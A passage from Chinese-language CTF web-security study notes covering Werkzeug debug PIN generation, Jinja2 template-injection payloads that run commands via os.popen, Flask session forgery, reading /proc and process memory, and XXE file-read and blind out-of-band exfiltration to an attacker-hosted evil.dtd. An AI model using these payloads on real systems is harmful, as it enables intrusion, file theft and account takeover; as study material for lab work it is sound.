getattr(mod, '__file__', None) app.py的绝对路径,flask目录下的一个app.py的绝对路径 从网站报错信息中可以看到
5. uuidnode
    当前网络的mac地址的十进制数
    通过uuid.getnode()读取
    通过文件/sys/class/net/eth0/address得到16进制结果，注意结果去掉冒号，16进制转化为10进制
    读取文件**/sys/class/net/eth0/address 或者 /sys/class/net/eth33/address eth0为网卡
6. machine_id
每一个机器都会有自已唯一的id，machine_id由三个合并(docker就后两个)：
    1./etc/machine-id 
    2./proc/sys/kernel/random/boot_id 
    3./proc/self/cgroup
    #linux的id一般存放在/etc/machine-id或/proc/sys/kernel/random/boot_id，有的系统没有这两个文件。
    #docker机则读取/proc/self/cgroup，其中第一行的/docker/字符串后面的内容作为机器的id


    ####docker-id也可以在以下文件夹下寻找    
    /proc/self/mountinfo
    /proc/self/mounts
    /proc/self/cgroup
    /proc/self/cpuset
    ####self绕过：self可以替换为数字进行读取对应文件
    如/proc/self/cpuset
```

拿到上面的所要的6个信息后，将信息填入下面POC中，即可生成PING码

```py
import hashlib
from itertools import chain
probably_public_bits = [
    'kingkk',# username
    'flask.app',# modname
    'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
    '/home/kingkk/.local/lib/python3.5/site-packages/flask/app.py' # getattr(mod, '__file__', None),
]

private_bits = [
    '52242498922',# str(uuid.getnode()),  /sys/class/net/ens33/address
    '19949f18ce36422da1402b3e3fe53008'# get_machine_id(), /etc/machine-id
]

h = hashlib.md5()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv =None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num

print(rv)
```

## 0x19 模板注入可用类寻找思路

> 参考：https://xz.aliyun.com/t/7746?time__1311=n4%2BxnD0G0%3DKWT4xBkbFey8hDRDjxYvpix&alichlgref=https%3A%2F%2Fwww.google.com%2F#toc-7
>
> https://www.secpulse.com/archives/198454.html

### 1. 找可利用的类

```
from flask import Flask,request
from jinja2 import Template
search = 'eval'   
num = -1
for i in ().__class__.__bases__[0].__subclasses__():
    num += 1
    try:
        if search in i.__init__.__globals__.keys():
            print(i, num)
    except:
        pass
```

这是一个找可利用类的脚本，可供师傅们自己去发掘利用链，想利用啥，就找啥就行了。

比如我这里想寻找`__builtins__`，且靶机使用的是`jinja2`，那么我们就可以有限寻找`jinja2`的类

![image-20240515205233483](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20240515205233483.png)

成功搜索到靶机带有`jinja2.bccache.Bucket`类

![image-20240515205321548](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20240515205321548.png)

### 2. `__builtins__`下的多个函数

`__builtins__`下有`eval`，`__import__`等的函数，可以利用此来执行命令。（在找到拥有`__builtins__`类的函数之后把需要一改往下套就行）

```
"".__class__.__bases__[0].__subclasses__()[250].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('id').read()")
"".__class__.__bases__[0].__subclasses__()[250].__init__.__globals__.__builtins__.eval("__import__('os').popen('id').read()")
"".__class__.__bases__[0].__subclasses__()[250].__init__.__globals__.__builtins__.__import__('os').popen('id').read()
"".__class__.__bases__[0].__subclasses__()[250].__init__.__globals__['__builtins__']['__import__']('os').popen('id').read()
```

==**下面的函数同理**==

#### 直接使用`popen`（python2不行）

`os._wrap_close`类里有popen。

```
"".__class__.__bases__[0].__subclasses__()[128].__init__.__globals__['popen']('whoami').read()
"".__class__.__bases__[0].__subclasses__()[128].__init__.__globals__.popen('whoami').read()
```

#### 使用`os`下的`popen`

可以从含有os的基类入手，比如说`linecache`。

```
"".__class__.__bases__[0].__subclasses__()[250].__init__.__globals__['os'].popen('whoami').read()
```

#### 利用python2的`file`类读写文件

在python3中`file`类被删除了，所以以下payload只有python2中可行。
用`dir`来看看内置的方法:
[![img](https://xzfile.aliyuncs.com/media/upload/picture/20200509182808-c6aa8b28-91df-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20200509182808-c6aa8b28-91df-1.png)

```
#读取文件类，<type ‘file’> file位置一般为40，直接调用
[].__class__.__bases__[0].__subclasses__()[40]('etc/passwd').read()
[].__class__.__bases__[0].__subclasses__()[40]('etc/passwd').readlines()
#写文件
"".__class__.__bases__[0].__bases__[0].__subclasses__()[40]('/tmp').write('test')
#python2的str类型不直接从属于属于基类，所以要两次 .__bases__
```

# FLASK Session 伪造

## 1. 认识Flask Session

除了请求对象之外还有一种称为 [`session`](https://dormousehole.readthedocs.io/en/latest/api.html#flask.session) 的对象，允许您在 不同请求之间储存信息。这个对象相当于用密钥签名加密的 cookie ，即用户 可以查看您的 cookie ，但是如果没有密钥就无法修改它。

使用会话之前您必须设置一个密钥。举例说明:

```python
import flask
from flask import session,request,redirect,url_for

app = flask.Flask(__name__)
# 指定 secret_key
app.secret_key = '123456'


@app.route('/')
def index():
    if 'username' in session:
        print(session)
        return f'Logged in as {session["username"]}'
    return 'You are not logged in'

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        session['username'] = request.form['username']
        return redirect(url_for('index'))
    return '''
        <form method="post">
            <p><input type=text name=username>
            <p><input type=submit value=Login>
        </form>
    '''


if __name__ == '__main__':
    app.run(debug=True, host="0.0.0.0")
```

在`/login`中登录`sugar`用户拿到了下面的Cookie

```
eyJ1c2VybmFtZSI6InN1Z2FyIn0.ZVeIiA.Y-4ERNC7D9bs9nxtDvf2YiGROJE
Cookie 格式：base64加密的Session数据(经过了json、zlib压缩处理的字符串) . 时间戳 . 签名
```

***时间戳***用来告诉服务端数据最后一次更新的时间，超过31天的会话，将会过期，变为无效会话；***签名***是利用`Hmac`算法，将session数据和时间戳加上`secret_key`加密而成的，用来保证数据没有被修改。

## 2. Flask Session 加解密

> 工具地址：https://github.com/noraj/flask-session-cookie-manager

### 2.1 使用方法

#### Encode

```
usage: flask_session_cookie_manager{2,3}.py encode [-h] -s <string> -t <string>

optional arguments:
  -h, --help            show this help message and exit
  -s <string>, --secret-key <string>
                        Secret key
  -t <string>, --cookie-structure <string>
                        Session cookie structure
```

#### Decode

```
usage: flask_session_cookie_manager{2,3}.py decode [-h] [-s <string>] -c <string>

optional arguments:
  -h, --help            show this help message and exit
  -s <string>, --secret-key <string>
                        Secret key
  -c <string>, --cookie-value <string>
                        Session cookie value
```

#### Examples

```bash
# 加密；由于加密的时间戳不一样，所以后面两段也会不一样
┌──(root㉿kali)-[/home/kali/ctfTool/web/flask-session-cookie-manager]
└─# python3 flask_session_cookie_manager3.py encode -s '123456' -t "{'username': 'sugar'}"
eyJ1c2VybmFtZSI6InN1Z2FyIn0.ZVeMxQ.Q_Jii2nKHpZbCIE0PpC-wu2nSLg

# 解密：
┌──(root㉿kali)-[/home/kali/ctfTool/web/flask-session-cookie-manager]
└─# python3 flask_session_cookie_manager3.py decode -s '123456' -c 'eyJ1c2VybmFtZSI6InN1Z2FyIn0.ZVeIiA.Y-4ERNC7D9bs9nxtDvf2YiGROJE'
{'username': 'sugar'}
```

## 3. Flask Session 伪造

**伪造前期：拿到`SECRET_KEY`**

将上面的 Flask 代码在本地搭建

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20231118001507347.png" alt="image-20231118001507347" style="zoom: 67%;" />

路由到`/login`登录

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20231118001535832.png" alt="image-20231118001535832" style="zoom: 67%;" />

单击login后可看到我们现在的身份是：sugar

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20231118001607950.png" alt="image-20231118001607950" style="zoom: 67%;" />

使用上面的工具伪造一段Session

```bash
┌──(root㉿kali)-[/home/kali/ctfTool/web/flask-session-cookie-manager]
└─# python3 flask_session_cookie_manager3.py encode -s '123456' -t "{'username': 'admin'}"                                         
eyJ1c2VybmFtZSI6ImFkbWluIn0.ZVeQzA.bAPRIEf6W2867fmwCgFuvBG5CXA
```

将这段Session粘贴到Cookie中；用hackbar或者bp，伪造成功！

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20231118001737343.png" alt="image-20231118001737343" style="zoom: 67%;" />

# Linux 虚拟文件系统 /proc

## 1. Linux 常用虚拟文件

**/proc/[pid]/auxv**

/proc/[pid]/auxv 包含传递给进程的 ELF 解释器信息，格式是每一项都是一个 unsigned long长度的 ID 加上一个 unsigned long 长度的值。最后一项以连续的两个 0x00 开头。举例如下：

```
$ hexdump -x /proc/2406/auxv

0000000    0021    0000    0000    0000    f000    f7fa    7fff    0000
0000010    0010    0000    0000    0000    fbff    1f8b    0000    0000
0000020    0006    0000    0000    0000    1000    0000    0000    0000
0000030    0011    0000    0000    0000    0064    0000    0000    0000
0000040    0003    0000    0000    0000    0040    0040    0000    0000
0000050    0004    0000    0000    0000    0038    0000    0000    0000
0000060    0005    0000    0000    0000    0007    0000    0000    0000
0000070    0007    0000    0000    0000    0000    0000    0000    0000
0000080    0008    0000    0000    0000    0000    0000    0000    0000
0000090    0009    0000    0000    0000    55e0    0045    0000    0000
00000a0    000b    0000    0000    0000    0000    0000    0000    0000
00000b0    000c    0000    0000    0000    0000    0000    0000    0000
00000c0    000d    0000    0000    0000    0000    0000    0000    0000
00000d0    000e    0000    0000    0000    0000    0000    0000    0000
00000e0    0017    0000    0000    0000    0000    0000    0000    0000
00000f0    0019    0000    0000    0000    f079    f7f6    7fff    0000
0000100    001f    0000    0000    0000    ffea    f7f6    7fff    0000
0000110    000f    0000    0000    0000    f089    f7f6    7fff    0000
0000120    0000    0000    0000    0000    0000    0000    0000    0000
0000130
```

**/proc/[pid]/cmdline**

/proc/[pid]/cmdline 是一个只读文件，包含进程的完整[命令](https://www.linuxcool.com/)行信息。如果该进程已经被交换出内存或者这个进程是 zombie 进程，则这个文件没有任何内容。该文件以空字符 null 而不是换行符作为结束标志。举例如下：

```
$ ps aux|grep frps
root      2406  0.1  0.1  54880 10524 ?        Sl   Dec11  21:30 frps -c ./frps.ini

$ cat /proc/2406/cmdline
frps-c./frps.ini
```

**/proc/[pid]/comm**

/proc/[pid]/comm 包含进程的[命令](https://www.linuxcool.com/)名。举例如下：

```
$ cat /proc/2406/comm
frps
```

**/proc/[pid]/cwd**

/proc/[pid]/cwd 是进程当前工作目录的符号链接。举例如下：

```
$ ls -lt /proc/2406/cwd
lrwxrwxrwx 1 root root 0 Dec 12 20:39 /proc/2406/cwd -> /home/mike/frp_0.13.0_linux_amd64
```

**/proc/[pid]/environ**

/proc/[pid]/environ 显示进程的环境变量。举例如下：

```
$ strings /proc/2406/environ

SUPERVISOR_GROUP_NAME=ssh
TERM=linux
SUPERVISOR_SERVER_URL=unix:///var/run/supervisor.sock
SUPERVISOR_PROCESS_NAME=ssh
RUNLEVEL=2
UPSTART_EVENTS=runlevel
PREVLEVEL=N
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
UPSTART_INSTANCE=
UPSTART_JOB=rc
SUPERVISOR_ENABLED=1
runlevel=2
PWD=/
previous=N
```

**/proc/[pid]/exe**

/proc/[pid]/exe 为实际运行程序的符号链接。举例如下：

```
$ ls -lt /proc/2406/exe
lrwxrwxrwx 1 root root 0 Dec 11 19:00 /proc/2406/exe -> /usr/bin/frps
```

**/proc/[pid]/fd**

/proc/[pid]/fd 是一个目录，包含进程打开文件的情况。举例如下：

```
$ ls -lt /proc/2406/fd

lrwx------ 1 root root 64 Dec 24 09:39 77 -> socket:[44377722]
lrwx------ 1 root root 64 Dec 17 15:07 47 -> socket:[29482617]
lr-x------ 1 root root 64 Dec 12 20:18 0 -> pipe:[13282]
l-wx------ 1 root root 64 Dec 12 20:18 1 -> pipe:[13283]
lrwx------ 1 root root 64 Dec 12 20:18 10 -> socket:[12238218]
lrwx------ 1 root root 64 Dec 12 20:18 4 -> anon_inode:[eventpoll]
lrwx------ 1 root root 64 Dec 12 20:18 40 -> socket:[19378614]
```

目录中的每一项都是一个符号链接，指向打开的文件，数字则代表文件描述符。

**/proc/[pid]/latency**

/proc/[pid]/latency 显示哪些代码造成的延时比较大。如果要使用这个特性需要执行：

```
$ echo 1 > /proc/sys/kernel/latencytop
```

举例如下

```
$ cat /proc/2406/latency

Latency Top version : v0.1
30667 10650491 4891 poll_schedule_timeout do_sys_poll SyS_poll system_call_fastpath 0x7f636573dc1d
8 105 44 futex_wait_queue_me futex_wait do_futex SyS_futex system_call_fastpath 0x7f6365a167bc
```

每一行前三个数字分别是后面代码执行的次数、总共执行延迟时间(单位是微秒)和最长执行延迟时间(单位是微秒)。后面则是代码完整的调用栈。

**/proc/[pid]/maps**

/proc/[pid]/maps 显示进程的内存区域映射信息。举例如下：

```
$ cat /proc/2406/maps
00400000-006ea000 r-xp 00000000 fd:01 1727569                            /usr/bin/frps
006ea000-00a6c000 r--p 002ea000 fd:01 1727569                            /usr/bin/frps
00a6c000-00ab1000 rw-p 0066c000 fd:01 1727569                            /usr/bin/frps
00ab1000-00ad4000 rw-p 00000000 00:00 0
c000000000-c00000b000 rw-p 00000000 00:00 0
c41feac000-c420000000 rw-p 00000000 00:00 0
c420000000-c420400000 rw-p 00000000 00:00 0
c420400000-c420700000 rw-p 00000000 00:00 0
c420700000-c420800000 rw-p 00000000 00:00 0
c420800000-c420900000 rw-p 00000000 00:00 0
c420900000-c420a00000 rw-p 00000000 00:00 0
c420a00000-c421ea0000 rw-p 00000000 00:00 0
c421ea0000-c422a00000 rw-p 00000000 00:00 0
c422a00000-c422a60000 rw-p 00000000 00:00 0
7f0418c01000-7f0418ee1000 rw-p 00000000 00:00 0
7ffff7f4f000-7ffff7f70000 rw-p 00000000 00:00 0                          [stack:5121]
7ffff7fad000-7ffff7faf000 r--p 00000000 00:00 0                          [vvar]
7ffff7faf000-7ffff7fb1000 r-xp 00000000 00:00 0                          [vdso]
ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]
```

其中注意的一点是 [stack:] 是线程的堆栈信息，对应于 /proc/[pid]/task/[tid]/ 路径。

**/proc/[pid]/root**

/proc/[pid]/root 是进程根目录的符号链接。举例如下：

```
$  ls -lt /proc/2406/root
lrwxrwxrwx 1 root root 0 Dec 12 20:39 /proc/2406/root -> /
```

**/proc/[pid]/stack**

/proc/[pid]/stack 示当前进程的内核调用栈信息，只有内核编译时打开了 CONFIG_STACKTRACE 编译选项，才会生成这个文件。举例如下：

```
$ cat /proc/2406/stack
[] futex_wait_queue_me+0xc6/0x130
[] futex_wait+0x17d/0x270
[] do_futex+0xd5/0x520
[] SyS_futex+0x71/0x150
[] entry_SYSCALL_64_fastpath+0x16/0x75
[] 0xffffffffffffffff
```

**/proc/[pid]/statm**

/proc/[pid]/statm 显示进程所占用内存大小的统计信息。包含七个值，度量单位是 page(page大小可通过 getconf PAGESIZE 得到)。举例如下：

```
$ cat /proc/2406/statm
13720 2617 493 746 0 12007 0
```

各个值含义：

```
a）进程占用的总的内存
b）进程当前时刻占用的物理内存
c）同其它进程共享的内存
d）进程的代码段
e）共享库(从2.6版本起，这个值为0)
f）进程的堆栈
g）dirty pages(从2.6版本起，这个值为0)
```

**/proc/[pid]/status**

/proc/[pid]/status 包含进程的状态信息。其很多内容与 /proc/[pid]/stat 和 /proc/[pid]/statm 相同，但是却是以一种更清晰地方式展现出来。举例如下：

```
$ cat /proc/2406/status
Name:   frps
State:  S (sleeping)
Tgid:   2406
Ngid:   0
Pid:    2406
PPid:   2130
TracerPid:  0
Uid:    0   0   0   0
Gid:    0   0   0   0
FDSize: 128
Groups: 0
NStgid: 2406
NSpid:  2406
NSpgid: 2406
NSsid:  2130
VmPeak:    54880 kB
VmSize:    54880 kB
VmLck:         0 kB
VmPin:         0 kB
VmHWM:     34872 kB
VmRSS:     10468 kB
VmData:    47896 kB
VmStk:       132 kB
VmExe:      2984 kB
VmLib:         0 kB
VmPTE:        68 kB
VmPMD:        20 kB
VmSwap:        0 kB
HugetlbPages:          0 kB
Threads:    11
SigQ:   0/31834
SigPnd: 0000000000000000
ShdPnd: 0000000000000000
SigBlk: 0000000000000000
SigIgn: 0000000000000000
SigCgt: fffffffe7fc1feff
CapInh: 0000000000000000
CapPrm: 0000003fffffffff
CapEff: 0000003fffffffff
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000
Seccomp:    0
Cpus_allowed:   f
Cpus_allowed_list:  0-3
Mems_allowed:   00000000,00000001
Mems_allowed_list:  0
voluntary_ctxt_switches:    2251028
nonvoluntary_ctxt_switches: 18031
```

关于信号（signal）的信息：SigQ 分为两部分（例如 0/31834），前面表示当前处在队列中的信号（0），后面则表示队列一共可以存储多少信号（31834）；SigPnd 表示当前线程 pending 的信号，而ShdPnd 则表示整个进程 pending 的信号；SigBlk、SigIgn 和 SigCgt 分别表示对信号的处理是阻塞，忽略，还是捕获。（关于Unix信号的相关知识，可以参考 Unix: Dealing with signals）。

**/proc/[pid]/syscall**

/proc/[pid]/syscall 显示当前进程正在执行的系统调用。举例如下：

```
$ cat /proc/2406/syscall
202 0xab3730 0x0 0x0 0x0 0x0 0x0 0x7ffff7f6ec68 0x455bb3
```

第一个值是系统调用号（202代表poll），后面跟着 6 个系统调用的参数值（位于寄存器中），最后两个值依次是堆栈指针和指令计数器的值。如果当前进程虽然阻塞，但阻塞函数并不是系统调用，则系统调用号的值为 -1，后面只有堆栈指针和指令计数器的值。如果进程没有阻塞，则这个文件只有一个 running 的字符串。

内核编译时打开了 CONFIG_HAVE_ARCH_TRACEHOOK 编译选项，才会生成这个文件。

**/proc/[pid]/wchan**

/proc/[pid]/wchan 显示当进程 sleep 时，kernel 当前运行的函数。举例如下：

```
$ cat /proc/2406/wchan
futex_wait_queue_meadmin
```

**/proc/[pic]/mem**

访问指定程序的内存信息，由于有一些内存空间没有权限问，所以会报错

```bbash
┌──(kali㉿kali)-[~/test]
└─$ sudo cat /proc/2663/mem    
cat: /proc/2663/mem: 输入/输出错误
```

## 2. Linux 访问内存文件

使用**/proc/[pid]/maps**可查看程的内存区域映射信息。一般权限是`rw-`的才能读取

```bash
55b8a2ccf000-55b8a2cd3000 rw-p 00000000 00:00 0 
55b8a345b000-55b8a349f000 rw-p 00000000 00:00 0                          [heap]
55b8a349f000-55b8a367b000 rw-p 00000000 00:00 0                          [heap]
55b8a367b000-55b8a36c2000 rw-p 00000000 00:00 0                          [heap]
```

使用python脚本访问相应的内存信息

```py
# 十六进制转十进制
seek_start = int('55b8a349f000', 16)
seek_end = int('55b8a367b000', 16)
with open('/proc/2663/mem', 'rb') as f:
    # 将光标定位到有权访问的位置
    f.seek(seek_start)
   	# 访问有权访问的长度
    data = f.read(seek_end - seek_start)

print(data)
```

## 3. Python 批量访问脚本

```py
import re


def read_mem(pid):
    # 读取 maps 文件
    with open(f"/proc/{pid}/maps", 'rb') as f:
        # 将 maps.txt 信息写入记事本
        with open('maps.txt', 'wb') as j:
            j.write(f.read())

    # 55b8a2ccb000-55b8a2ccf000
    # 逐行读取 maps.txt
    with open('maps.txt', 'r') as f:
        # 逐行读取文件
        for line in f:
            if 'rw-p' in line:
                start = re.search('([0-9a-z]{12})-', line)
                end = re.search('-([0-9a-z]{12})', line)

                # 格式处理
                start = int(str(start.group(1)), 16)
                end = int(str(end.group(1)), 16)
                with open(f'/proc/{pid}/mem', 'rb') as mem:
                    mem.seek(start)
                    mem_data = mem.read(end - start)

                    # 得到的结果最后保存
                    with open('result.txt', 'wb') as res:
                        res.write(mem_data)


if __name__ == '__main__':
    # 你要访问的内存他的PID是多少这里就是多少
    read_mem(2663)
```

# XXE注入

> 参考：https://www.cnblogs.com/20175211lyz/p/11413335.html

## 1. PHP 解析XML

### 1. PHP XML DOM

#### 1.1 XML 解析

如需读取和更新 - 创建和处理 - 一个 XML 文档，您需要 XML 解析器。

有两种基本的 XML 解析器类型：

- 基于树的解析器：这种解析器把 XML 文档转换为树型结构。它分析整篇文档，并提供了对树中元素的访问，例如文档对象模型 (DOM)。
- 基于事件的解析器：将 XML 文档视为一系列的事件。当某个具体的事件发生时，解析器会调用函数来处理。

DOM 解析器是基于树的解析器。

请看下面的 XML 文档片段：

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<from>Jani</from>
```

XML DOM 把上面的 XML 视为一个树形结构：

- Level 1: XML 文档
- Level 2: 根元素： `<from>`
- Level 3: 文本元素： `Jani`

**所有的XML都必须有且仅有一个根节点**

#### 1.2 XML 文件

将下面的内容保存名为：`text.xml`

```xml
<?xml version="1.0" encoding="UTF-8" ?>						<!--XML头声明，可有可无，建议写-->
<!DOCTYPE note [
        <!ELEMENT note (to, from, heading, body)>           <!--声明note元素和它的子元素，其中子元素必须以它声明的顺序出现-->
        <!ELEMENT to (#PCDATA)>                             <!--#PCDATA 字符数据-->
        <!ELEMENT from (#PCDATA)>
        <!ELEMENT heading (#PCDATA)>
        <!ELEMENT body (#PCDATA)>
        <!ELEMENT test (#PCDATA)>
        <!ENTITY jt "ad Test">                              <!--定义实体，后续以 &实体名; 的形式调用-->
        ]>

<note>
    <to>Jack</to>
    <from>Tom</from>
    <heading>Don't forget me</heading>
    <body>&jt;</body>
</note>
```

**以上 DTD 解释如下：**

*!DOCTYPE note* (第二行)定义此文档是 *note* 类型的文档。

*!ELEMENT note* (第三行)定义 *note* 元素有四个元素："to、from、heading,、body"

*!ELEMENT to* (第四行)定义 *to* 元素为 "#PCDATA" 类型

*!ELEMENT from* (第五行)定义 *from* 元素为 "#PCDATA" 类型

*!ELEMENT heading* (第六行)定义 *heading* 元素为 "#PCDATA" 类型

*!ELEMENT body* (第七行)定义 *body* 元素为 "#PCDATA" 类型

#### 1.3 加载和输出XML

```php
<?php
$xmlDoc = new DOMDocument();
# 把 test.xml 加载到这个文档对象中
$xmlDoc->load("test.xml");
# saveXML() 函数把内部 XML 文档放入一个字符串，然后直接将XML内容当作字符串输出
echo $xmlDoc->saveXML();

# 输出
<?xml version="1.0" encoding="ISO-8859-1"?>
<note>
    <to>Tove</to>
    <from>Jani</from>
    <heading>Reminder</heading>
    <body>Don't forget me this weekend!</body>
</note>
```

#### 1.4 遍历XML

当 XML 生成时，它通常会在节点之间包含空白。XML DOM 解析器把它们当作普通的元素，如果您不注意它们，有时会产生问题。

```php
<?php
$xmlDoc = new DOMDocument();
$xmlDoc->load("test.xml");

$x = $xmlDoc->documentElement;
foreach ($x->childNodes AS $item){
    echo $item->nodeName."=".$item->nodeValue."<br/>";
}

# 输出
#text=
    <br/>to=Tove<br/>#text=
    <br/>from=Jani<br/>#text=
    <br/>heading=Reminder<br/>#text=
    <br/>body=Don't forget me this weekend!<br/>#text=
<br/>
```

### 2. PHP Simple XML

SimpleXML 可把 XML 文档（或 XML 字符串）转换为对象，比如：

- 元素被转换为 `SimpleXMLElement` 对象的单一属性。当同一级别上存在多个元素时，它们会被置于**数组**中。
- 属性通过使用**关联数组**进行访问，其中的**索引对应属性名称**。
- 元素内部的文本被转换为字符串。如果一个元素拥有多个文本节点，则按照它们被找到的顺序进行排列。

```php
<?php
$xml = simplexml_load_file("test.xml");
print_r($xml);

# 输出
SimpleXMLElement Object
(
    [to] => Tove
    [from] => Jani
    [heading] => Reminder
    [body] => Don't forget me this weekend!
)
```

## 2. XML基础知识

### 2.1 XML

`XML`即 可扩展标记语言（EXtensible Markup Language），是一种标记语言，其标签没有预定义，您需要自行定义标签，是W3C的推荐标准。其于HTML的区别是：

- HTML 被设计用来**显示数据**
- XML 被设计用来**传输和存储数据**

XML文档结构包括：

- XML声明
- DTD文档类型定义（可选）
- 文档元素

```xml
<!--XML声明-->
<?xml version="1.0" encoding="UTF-8"?>

<!--DTD，这部分可选的-->          
<!DOCTYPE foo [ 
    <!ELEMENT foo ANY >
    <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini" >
]>

<!--文档元素-->                                                                          
<foo>&xxe;</foo>

```

### 2.2 DTD概念及声明/引用方式

DTD：Document Type Definition 即文档类型定义，用来为XML文档定义语义约束。可以嵌入在XML文档中(内部声明)，也可以独立的放在一个文件中(外部引用)，由于其支持的数据类型有限，无法对元素或属性的内容进行详细规范，在可读性和可扩展性方面也比不上XML Schema。

DTD一般认为有两种引用或声明方式：

- 1、内部DTD：即对XML文档中的元素、属性和实体的DTD的声明都在XML文档中。
- 2、外部DTD：即对XML文档中的元素、属性和实体的DTD的声明都在一个独立的DTD文件（.dtd）中。

DTD实体有以下几种声明方式

**内部实体**

```xml
<!DOCTYPE note [
    <!ENTITY a "admin">
]>
<note>&a</note>
<!-- admin -->
```

PHP 代码解析	

```php
<?php
# 将XML文档转换为对象
$xml = simplexml_load_file("test.xml", null, LIBXML_NOENT);
# 强转 SimpleXMLElement，该类自带：__toString() 方法，可返回元素的文本内容
var_dump((string)$xml);
```

**参数实体**

```xml
<!DOCTYPE note[
        <!ENTITY % b "<!ENTITY b1 'aws1'>">
        %b;
        ]>
<note>&b1;</note>
<!-- aws1 -->
```

PHP 代码解析

```php
<?php
$xml = simplexml_load_file("test.xml", null, LIBXML_NOENT);
var_dump($xml);
var_dump((string)$xml)
```

- 参数实体用`% name`申明，引用时用`%name;`，只能在`DTD`中申明，`DTD`中引用。
- 其余实体直接用`name`申明，引用时用`&name;`，只能在`DTD`中申明，可在`xml`文档中引用

**外部实体**

```xml
<!DOCTYPE note [
    <!ENTITY c SYSTEM "php://filter/read=convert.base64-encode/resource=flag.php">
]>
<note>&c</note>
<!-- PD9waHANCiRmbGFnID0gImZsYWcgaXMgdGhpcyI7DQplY2hvICRmbGFnOw0K -->
```

PHP 代码解析

```php
<?php
$xml = simplexml_load_file("test.xml", null, LIBXML_NOENT);
var_dump($xml);
var_dump((string)$xml);
```

外部引用可支持http，file等协议，不同的语言支持的协议不同，但存在一些通用的协议，具体内容如下所示：

![img](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/1270588-20200115235522292-2141935835.png)

上图是默认支持协议，还可以支持其他，如PHP支持的扩展协议有

![img](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/1270588-20200115235555856-2031563427.png)

**外部参数实体**

```xml
<!DOCTYPE note [
    <!ENTITY % d SYSTEM "http://127.0.0.1/test.dtd">
    %d;
]>
<note>&d1</note>
<!-- sugar -->
```

http://127.0.0.1/test.dtd

```xml
<!ENTITY d1 SYSTEM "data://text/plain;base64,c3VnYXI=">
```

PHP 代码解析

```php
<?php
$xml = simplexml_load_file("test.xml", null, LIBXML_NOENT);
var_dump($xml);
var_dump((string)$xml);
```

## 3. XML 外部实体注入

#### 3.1 任意文件读取

最简单也是最常用的利用方式
一般xxe利用分为两大场景：有回显和无回显。有回显的情况可以直接在页面中看到Payload的执行结果或现象，无回显的情况又称为Blind XXE，可以使用外带数据通道提取数据。

##### 有回显

**恶意引入外部实体**

直接读靶机文件，这里支持常用的PHP伪协议

```xml
<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE foo [
        <!ENTITY rabbit SYSTEM "php://filter/read=convert.base64-encode/resource=flag.php" >
        ]>
<user><username>&rabbit;</username><password>123</password></user>
```

PHP 代码解析

```php
<?php
$xml = simplexml_load_file("test.xml", null, LIBXML_NOENT);
var_dump((string)$xml->username);
var_dump((string)$xml->password);
```

**恶意引入外部参数实体**

```xml
<?xml version="1.0" ?>
<!DOCTYPE test [
        <!ENTITY % file SYSTEM "http://127.0.0.1/hack.dtd">
        %file;
        ]>
<test>&hhh;</test>
```

hack.dtd

```xml
<!ENTITY hhh SYSTEM 'php://filter/read=convert.base64-encode/resource=D:/flag.txt'>
```

PHP代码解析

```php
<?php
$xml = simplexml_load_file("test.xml", null, LIBXML_NOENT);
var_dump((string)$xml);
```

##### 无回显

先使用`php://filter`获取目标文件的内容，然后将内容以`http`请求发送到接受数据的服务器(攻击服务器)xxx.xxx.xxx。

```xml
<!DOCTYPE updateProfile [
    <!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=./target.php">
    <!ENTITY % dtd SYSTEM "http://xxx.xxx.xxx/evil.dtd">
    %dtd;
    %send;
]>
```

evil.dtd的内容，内部的%号要进行实体编码成&#x25。

```xml
<!ENTITY % all
    "<!ENTITY &#x25; send SYSTEM 'http://xxx.xxx.xxx/?data=%file;'>"
>
%all;
```

访问接受数据的服务器中的**日志信息**，可以看到经过base64编码过的数据，解码后便可以得到数据。

流程：

1. file 实体获取敏感文件数据：`target.php`
2. dtd 实体获取服务器的dtd文件并执行
3. sned 实体带着数据访问服务器	

##### 基于报错

> 基于报错的原理和OOB类似，OOB通过构造一个带外的url将数据带出，而基于报错是构造一个错误的url并将泄露文件内容放在url中，通过这样的方式返回数据。
> 所以和OOB的构造方式几乎只有url出不同，其他地方一模一样。

**通过引入服务器文件**

```xml
<?xml version="1.0"?>
<!DOCTYPE message [
	<!ENTITY % remote SYSTEM "http://blog.szfszf.top/xml.dtd">
	<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///flag">
	%remote;
	%send;
]>
<message>1234</message>
```

xml.dtd

```xml
<!-- xml.dtd -->
<!ENTITY % start "<!ENTITY &#x25; send SYSTEM 'file:///hhhhhhh/%file;'>">		<!-- 不同点在这里，构造了一个无法访问的URL然错误信息回弹 -->
%start;
```

##### 通过引入本地文件

